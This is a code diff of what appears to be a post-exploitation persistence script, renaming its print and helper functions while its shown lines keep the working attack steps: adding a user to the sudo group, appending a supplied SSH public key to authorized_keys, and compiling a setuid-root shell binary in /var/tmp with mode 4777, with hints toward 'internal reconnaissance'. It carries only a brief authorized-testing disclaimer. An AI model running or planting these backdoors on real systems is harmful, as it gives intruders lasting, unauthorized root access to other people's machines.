@@ -26,7 +26,7 @@ NORMAL='\033[0;39m'
 #############
 
 # Print banner
-fuBANNER() {
+print_banner() {
 # http://patorjk.com/software/taag/#p=display&f=Graffiti&t=Type%20Something
 echo "
   ____  _____ ____  ____ ___ ____ _____ _____ _   _  ____ _____ 
@@ -37,14 +37,14 @@ echo "
 "
 }
 
-fuADVISORY() {
+print_advisory() {
   echo
   echo "${BYELLOW}Advisory: ${BBLUE}Use this script for educational purposes and/or for authorized penetration testing only. The author is not responsible for any misuse or damage caused by this script. Use at your own risk.$NC"
   echo
 }
 
 # Print title
-fuTITLE() {
+print_title() {
   echo
   for i in $(seq 80); do
     echo -n "$BBLUE═$NC"
@@ -58,49 +58,49 @@ fuTITLE() {
 }
 
 # Print info line
-fuINFO() {
+print_info() {
   echo
   echo "$BBLUE════$BGREEN $1 $NC"
 }
 
 # Print error line
-fuERROR() {
+print_error() {
   echo
   echo "$BBLUE════$BRED $1 $NC"
 }
 
 # Print results line
-fuRESULT() {
+print_result() {
   echo
   echo "$BBLUE════$BYELLOW $1 $NC"
 }
 
 # Print next steps line
-fuSTEPS() {
+print_step() {
   echo
   echo "$BBLUE[X]$NC $1 $NC"
 }
 
 # Print message line
-fuMESSAGE() {
+print_message() {
   echo "$BBLUE----$NC $1 $NC"
 }
 
 # Print attention message line
-fuATTENTION() {
+print_attention() {
   echo "$BLUE----$YELLOW $1 $NC"
 }
 
 # Check for root permissions
-fuGOT_ROOT() {
-fuINFO "Checking for root"
+check_root() {
+print_info "Checking for root"
 if ([ -f /usr/bin/id ] && [ "$(/usr/bin/id -u)" -eq "0" ]) || [ "`whoami 2>/dev/null`" = "root" ]; then
   IAMROOT="1"
-  fuMESSAGE "You are root"
+  print_message "You are root"
   echo
 else
   IAMROOT=""
-  fuMESSAGE "You are not root"
+  print_message "You are not root"
   echo
 fi
 }
@@ -161,9 +161,9 @@ fi
 #########################################
 
 if [ ! "$QUIET" ]; then
-  fuBANNER
-  fuADVISORY
-  fuGOT_ROOT
+  print_banner
+  print_advisory
+  check_root
 fi
 sleep 1
 
@@ -184,66 +184,66 @@ if [ ! "$QUIET" ]; then echo "
 fi
 
 # check for root
-if [ ! "$IAMROOT" ]; then fuERROR "Aborting! Not root. Try \"sudo sh $0\"" && echo && exit; fi
+if [ ! "$IAMROOT" ]; then print_error "Aborting! Not root. Try \"sudo sh $0\"" && echo && exit; fi
 
 # check -p parameter
-if [ ! "$ADDPW" ]; then fuERROR "Aborting! No password given. You cannot login to that user until you set a password. Use the -p parameter" && echo && exit; fi
+if [ ! "$ADDPW" ]; then print_error "Aborting! No password given. You cannot login to that user until you set a password. Use the -p parameter" && echo && exit; fi
 
 # check if /bin/bash exists
 if [ -f "/bin/bash" ]; then BASH="1"; else BASH=""; fi
 
-fuTITLE "Trying to add the user \"$USERNAME\" with root privileges ..."
+print_title "Trying to add the user \"$USERNAME\" with root privileges ..."
 sleep 2
 if [ "$(command -v useradd 2>/dev/null)" ]; then
 #if $USERADD -g 0 -M -d /root -s /bin/bash $USERNAME 2>/dev/null; then
   if [ "$BASH" ]; then
     if useradd -m -s /bin/bash $USERNAME 2>/dev/null; then
-      ADDUSEROK="1" && fuINFO "user \"$USERNAME\" added"
+      ADDUSEROK="1" && print_info "user \"$USERNAME\" added"
     else
-      ADDUSEROK="" && fuERROR "unable to add user \"$USERNAME\"."
+      ADDUSEROK="" && print_error "unable to add user \"$USERNAME\"."
     fi
   else
     if useradd -m -s /bin/sh $USERNAME 2>/dev/null; then
-      ADDUSEROK="1" && fuINFO "user \"$USERNAME\" added"
+      ADDUSEROK="1" && print_info "user \"$USERNAME\" added"
     else
-      ADDUSEROK="" && fuERROR "unable to add user \"$USERNAME\"."
+      ADDUSEROK="" && print_error "unable to add user \"$USERNAME\"."
     fi
   fi
 else
-  fuERROR "command \"useradd\" not found"
+  print_error "command \"useradd\" not found"
 fi
 
 # add user to sudo group
 if [ "$ADDUSEROK" ]; then
-  fuTITLE "Trying to add user \"$USERNAME\" to sudo group ..."
+  print_title "Trying to add user \"$USERNAME\" to sudo group ..."
   sleep 2
   if [ "$(command -v usermod 2>/dev/null)" ]; then
     if usermod -a -G sudo $USERNAME 2>/dev/null; then
-      fuINFO "user \"$USERNAME\" added to sudo group"
+      print_info "user \"$USERNAME\" added to sudo group"
     else
-      fuERROR "unable to add user \"$USERNAME\" to sudo group"
+      print_error "unable to add user \"$USERNAME\" to sudo group"
     fi
   else
-    fuERROR "command \"usermod\" not found"
+    print_error "command \"usermod\" not found"
   fi
 fi
 
 # add password to given user
 if id -u $USERNAME 2>/dev/null; then
-  fuTITLE "Trying to add a password to user \"$USERNAME\" ..."
+  print_title "Trying to add a password to user \"$USERNAME\" ..."
   sleep 2
   if [ "$ADDPW" ]; then
     if [ $(cat /etc/os-release | grep -i 'Name="ubuntu"') ]; then
       if echo "$USERNAME:$PW" | sudo chpasswd 1>/dev/null 2>&1; then
-        fuINFO "given password added to user \"$USERNAME\""
+        print_info "given password added to user \"$USERNAME\""
       else
-        fuERROR "unable to add the password to given user \"$USERNAME\""
+        print_error "unable to add the password to given user \"$USERNAME\""
       fi
     else
       if printf "$PW\n$PW" | sudo passwd $USERNAME 1>/dev/null 2>&1; then
-        fuINFO "given password added to user \"$USERNAME\""
+        print_info "given password added to user \"$USERNAME\""
       else
-        fuERROR "unable to add the password to given user \"$USERNAME\""
+        print_error "unable to add the password to given user \"$USERNAME\""
       fi
     fi
   fi
@@ -268,25 +268,25 @@ if [ ! "$QUIET" ]; then echo "
 fi
 
 # check for root
-if [ ! "$IAMROOT" ]; then fuERROR "Aborting! Not root. Try \"sudo sh $0\"" && echo && exit; fi
+if [ ! "$IAMROOT" ]; then print_error "Aborting! Not root. Try \"sudo sh $0\"" && echo && exit; fi
 
-fuTITLE "Trying to add user \"$PRIVUSER\" to sudo group ..."
+print_title "Trying to add user \"$PRIVUSER\" to sudo group ..."
 sleep 2
 # check if given user exists
 if id -u $PRIVUSER 1>/dev/null 2>&1; then
-  fuMESSAGE "user $PRIVUSER found"
+  print_message "user $PRIVUSER found"
   if [ "$(command -v usermod 2>/dev/null)" ]; then
     # add user to sudo group
     if usermod -a -G sudo $PRIVUSER 2>/dev/null; then
-      ELEVATEPRIVOK="1" && fuINFO "user \"$PRIVUSER\" added to sudo group"
+      ELEVATEPRIVOK="1" && print_info "user \"$PRIVUSER\" added to sudo group"
     else
-      ELEVATEPRIVOK="" && fuERROR "unable to add user \"$PRIVUSER\" to sudo group."
+      ELEVATEPRIVOK="" && print_error "unable to add user \"$PRIVUSER\" to sudo group."
     fi
   else
-    fuERROR "command \"usermod\" not found"
+    print_error "command \"usermod\" not found"
   fi
 else
-  fuERROR "user $PRIVUSER not found"
+  print_error "user $PRIVUSER not found"
 fi
 
 }
@@ -309,24 +309,24 @@ if [ ! "$QUIET" ]; then echo "
 fi
 
 # check for root
-if [ "$IAMROOT" ]; then fuERROR "You are root! Don't run part \"modify ssh keys\" (-s) with \"sudo\"" && echo && exit; fi
+if [ "$IAMROOT" ]; then print_error "You are root! Don't run part \"modify ssh keys\" (-s) with \"sudo\"" && echo && exit; fi
 
 # check if local ssh server is running
-fuTITLE "Check if local ssh server is running ..."
+print_title "Check if local ssh server is running ..."
 sleep 2
 if ps aux 1>/dev/null 2>&1 | grep sshd | grep -v grep; then
-  fuMESSAGE "Local ssh server is running"
+  print_message "Local ssh server is running"
 elif netstat -plant 1>/dev/null 2>&1 | grep :22 | grep LISTEN; then
-  fuMESSAGE "Local ssh server is listening on port 22"
+  print_message "Local ssh server is listening on port 22"
 else
-  fuERROR "Probably no ssh server running on this host"
+  print_error "Probably no ssh server running on this host"
 fi
 
 # set current user to $USER
 if command -v whoami 1>/dev/null 2>&1; then
   USER=$(whoami 2>/dev/null)
 else
-  fuERROR "command \"whoami\" not found"
+  print_error "command \"whoami\" not found"
 fi
 
 # check if $HOME variable is set
@@ -339,28 +339,28 @@ fi
 # get local ip addresses
 LOCAL_IP=$(ip a | grep -vi docker | grep -Eo 'inet[^6]\S+[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | awk '{print $2}' | grep -E "^10\.|^172\.|^192\.168\.|^169\.254\.")
 
-fuTITLE "Trying to add given ssh public key to authorized_keys file of user \"$USER\" ..."
+print_title "Trying to add given ssh public key to authorized_keys file of user \"$USER\" ..."
 sleep 2
 if [ -d "$HOME/.ssh" ]; then
-  if echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys; then TRYCHMOD=""; else SSHOK="" && fuERROR "unable to write authorized_keys" && TRYCHMOD="1"; fi
+  if echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys; then TRYCHMOD=""; else SSHOK="" && print_error "unable to write authorized_keys" && TRYCHMOD="1"; fi
   if [ "$TRYCHMOD" ]; then
     if [ "$(command -v chmod 2>/dev/null)" ]; then
       chmod 700 "$HOME"/.ssh 2>/dev/null
-      echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys && SSHOK="1" && fuINFO "authorized_keys updated"
+      echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys && SSHOK="1" && print_info "authorized_keys updated"
     else 
-      fuERROR "command \"chmod\" not found"
+      print_error "command \"chmod\" not found"
     fi
   else
     SSHOK="1" && echo "authorized_keys updated"
   fi
 else
-  fuINFO "No .ssh directory exists, creating one ..."
+  print_info "No .ssh directory exists, creating one ..."
   if [ "$(command -v mkdir 2>/dev/null)" ]; then
     mkdir "$HOME"/.ssh 2>/dev/null && chmod 700 "$HOME"/.ssh 2>/dev/null && chmod 600 "$HOME"/.ssh/authorized_keys 2>/dev/null
   else
-    fuERROR "command \"mkdir\" not found"
+    print_error "command \"mkdir\" not found"
   fi
-  if echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys; then SSHOK="1" && fuINFO "authorized_keys updated"; else SSHOK="" && fuERROR "unable to write authorized_keys"; fi
+  if echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys; then SSHOK="1" && print_info "authorized_keys updated"; else SSHOK="" && print_error "unable to write authorized_keys"; fi
 fi
 
 }
@@ -370,7 +370,7 @@ fi
 # Create root shell #
 #####################
 
-root_shell() {
+create_root_shell() {
 
 if [ ! "$QUIET" ]; then echo "
    ____                _         ____             _     ____  _          _ _ 
@@ -383,7 +383,7 @@ if [ ! "$QUIET" ]; then echo "
 fi
 
 # check for root
-if [ ! "$IAMROOT" ]; then fuERROR "Aborting! Not root. Try \"sudo sh $0\"" && echo && exit; fi
+if [ ! "$IAMROOT" ]; then print_error "Aborting! Not root. Try \"sudo sh $0\"" && echo && exit; fi
 
 TMPDIR="/var/tmp"
 GCC=$(command -v gcc 2>/dev/null)
@@ -393,7 +393,7 @@ CHMOD=$(command -v chmod 2>/dev/null)
 # check if /bin/bash exists
 if [ -f "/bin/bash" ]; then BASH="1"; else BASH=""; fi
 
-fuTITLE "Trying to add a shell as a binary with suid bit set ..."
+print_title "Trying to add a shell as a binary with suid bit set ..."
 sleep 2
 if [ "$BASH" ]; then
   echo 'int main(void){setresuid(0, 0, 0);system("/bin/bash");}' > $TMPDIR/morannon.c
@@ -401,15 +401,15 @@ else
   echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPDIR/morannon.c
 fi
 if $GCC $TMPDIR/morannon.c -o $TMPDIR/morannon 2>/dev/null; then
-  fuMESSAGE "root shell \"$TMPDIR/morannon\" created"
+  print_message "root shell \"$TMPDIR/morannon\" created"
 else
-  fuERROR "root shell not created"
+  print_error "root shell not created"
 fi
 rm $TMPDIR/morannon.c
 if $CHOWN root:root $TMPDIR/morannon && $CHMOD 4777 $TMPDIR/morannon; then
-  ROOTSHELLOK="1" && fuINFO "root shell \"$TMPDIR/morannon\" usable"
+  ROOTSHELLOK="1" && print_info "root shell \"$TMPDIR/morannon\" usable"
 else
-  ROOTSHELLOK="" && fuERROR "root shell not usable"
+  ROOTSHELLOK="" && print_error "root shell not usable"
 fi
 
 }
@@ -421,7 +421,7 @@ fi
 
 if [ "$SERVE" ]; then
   
-  fuTITLE "Serving a local web server on port 8000 ..."
+  print_title "Serving a local web server on port 8000 ..."
 
   if command -v python3 1>/dev/null 2>&1; then
     python3 -m http.server 8000
@@ -430,7 +430,7 @@ if [ "$SERVE" ]; then
   elif command -v php 1>/dev/null 2>&1; then
     php -S 0.0.0.0:8000
   else
-    fuERROR "Aborting! Neither python nor php is installed."
+    print_error "Aborting! Neither python nor php is installed."
   fi
 fi
 
@@ -440,7 +440,7 @@ fi
 #############
 
 # add user
-if [ "$ADDUSER" ]; then add_user; elif [ "$ADDPW" ] && [ ! "$USERNAME" ]; then fuERROR "No username given. Try to add a user with -u parameter and combine it with -p"; fi
+if [ "$ADDUSER" ]; then add_user; elif [ "$ADDPW" ] && [ ! "$USERNAME" ]; then print_error "No username given. Try to add a user with -u parameter and combine it with -p"; fi
 
 # elevate privs
 if [ "$ELEVATEPRIV" ]; then elevate_privileges; fi
@@ -449,23 +449,23 @@ if [ "$ELEVATEPRIV" ]; then elevate_privileges; fi
 if [ "$SSH" ]; then modify_ssh_keys; fi
 
 # create a root shell
-if [ "$ROOTSHELL" ]; then root_shell; fi
+if [ "$ROOTSHELL" ]; then create_root_shell; fi
 
 
 #####################
 # Summarize Results #
 #####################
 
-fuTITLE "Following parts where successful:"
+print_title "Following parts where successful:"
 
 if [ "$ADDUSEROK" ]; then
-  fuRESULT "User \"$USERNAME\" added"
+  print_result "User \"$USERNAME\" added"
 fi
 if [ "$SSHOK" ]; then
-  fuRESULT "authorized_keys file updated"
+  print_result "authorized_keys file updated"
 fi
 if [ "$ROOTSHELLOK" ]; then
-  fuRESULT "A local root shell was created"
+  print_result "A local root shell was created"
 fi
 
 echo
@@ -487,28 +487,28 @@ fi
 
 if [ "$ADDUSER" ]; then
   if [ "$ADDUSEROK" ]; then
-    fuSTEPS "User $USERNAME added. To login with ssh, switch to the new user (su $USERNAME) and run the script again with -s parameter."
+    print_step "User $USERNAME added. To login with ssh, switch to the new user (su $USERNAME) and run the script again with -s parameter."
   fi
 fi
 
 if [ "$ELEVATEPRIV" ]; then
   if [ "$ELEVATEPRIVOK" ]; then
-    fuSTEPS "You already ran this script with sudo! So skip privilege escalation phase and move on to internal reconnaissance."
+    print_step "You already ran this script with sudo! So skip privilege escalation phase and move on to internal reconnaissance."
   fi
 fi
 
 if [ "$SSH" ]; then
   if [ "$SSHOK" ]; then
-    fuSTEPS "authorized_key file updated, if ssh server is running, remote ssh login should be possible to user \"$USER\" with given SSH key pair."
+    print_step "authorized_key file updated, if ssh server is running, remote ssh login should be possible to user \"$USER\" with given SSH key pair."
     for ip in $LOCAL_IP; do
-      fuSTEPS "From your Host: Try \"ssh $USER@$ip\""
+      print_step "From your Host: Try \"ssh $USER@$ip\""
     done
   fi
 fi
 
 if [ "$ROOTSHELL" ]; then
   if [ "$ROOTSHELLOK" ]; then
-    fuSTEPS "A local shell was created that gives you root privileges! You can use it as follows: \"$TMPDIR/morannon\"."
+    print_step "A local shell was created that gives you root privileges! You can use it as follows: \"$TMPDIR/morannon\"."
   fi
 fi
 
